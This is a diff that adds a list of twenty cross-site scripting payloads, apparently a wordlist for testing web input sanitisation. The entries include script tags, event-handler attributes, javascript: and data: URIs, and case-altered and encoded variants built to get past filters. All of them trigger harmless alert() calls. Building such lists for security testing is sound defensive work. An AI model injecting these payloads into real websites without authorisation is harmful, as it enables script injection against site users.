@@ -1,0 +1,20 @@
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+" onmouseover="alert('XSS')"
+' onmouseover='alert("XSS")'
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+jAvAsCrIpT:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+<iframe src=javascript:alert('XSS')>
+<object data=javascript:alert('XSS')>
+<embed src=javascript:alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
